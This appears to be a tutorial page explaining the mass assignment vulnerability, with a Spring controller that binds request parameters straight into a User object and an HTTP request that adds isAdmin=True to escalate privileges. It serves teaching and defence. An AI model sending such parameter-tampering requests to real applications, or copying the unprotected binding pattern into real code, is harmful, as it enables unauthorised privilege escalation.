Software frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers. This can sometimes cause harm.

Attackers can sometimes use this methodology to create new parameters that the developer never intended which in turn creates or overwrites new variable or objects in program code that was not intended.

This functionality becomes exploitable when:

- Attacker can guess common sensitive fields.
- Attacker has access to source code and can review the models for sensitive fields.
- AND the object with sensitive fields has an empty constructor.

# Example

Suppose there is a form for editing a user's account information:

```html
<form>
     <input name="userId" type="text">
     <input name="password" type="text">
     <input name="email" text="text">
     <input type="submit">
</form>
```

Here is the object that the form is binding to:

```java
@Data
public class User {
   private String userid;
   private String password;
   private String email;
   private boolean isAdmin;
}
```

Here is the controller handling the request:

```java
@RequestMapping(value = "/addUser", method = RequestMethod.POST)
public String submit(User user) {
   userService.add(user);
   return "successPage";
}
```

Here is the typical request:

```http
POST /addUser
...
userid=attacker&password=s3cret_pass&email=attacker@attacker-website.com
```

And here is the exploit in which we set the value of the attribute isAdmin of the instance of the class User:

```http
POST /addUser
...
userid=attacker&password=s3cret_pass&email=attacker@attacker-website.com&isAdmin=True
```

# References

- [OWASP Mass Assignment Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Mass_Assignment_Cheat_Sheet.md)
- [Spring MVC, protect yourself from Mass Assignment](https://domineospring.wordpress.com/2015/05/18/spring-mvc-proteja-se-do-mass-assignment/)
- [Security of your application and frameworks: the attack on GitHub](https://blog.caelum.com.br/seguranca-de-sua-aplicacao-e-os-frameworks-ataque-ao-github/)
- [Write up: Spring's setDisallowedFields bypass in the VolgaCTF2019 Shop task](https://gitlab.com/salted-crhackers/writeups/-/tree/master/2019/volgactf-qualifier/shop)
- [Write up: The VolgaCTF2019 Shop v2 task](https://balsn.tw/ctf_writeup/20190329-volgactfqual/#shop-v2)
